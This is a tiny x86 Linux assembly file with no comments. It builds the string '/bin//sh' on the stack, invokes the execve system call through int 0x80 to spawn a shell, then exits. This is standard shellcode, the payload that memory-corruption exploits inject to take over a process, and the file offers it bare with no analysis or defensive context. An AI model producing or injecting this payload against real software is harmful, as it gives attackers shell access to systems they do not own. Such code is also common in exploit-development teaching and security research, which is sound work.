global main
main:


xor eax,eax
push eax 
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
mov ecx,eax
xor eax,eax
mov al,11
int 0x80

mov al, 1
xor ebx,ebx
int 0x80




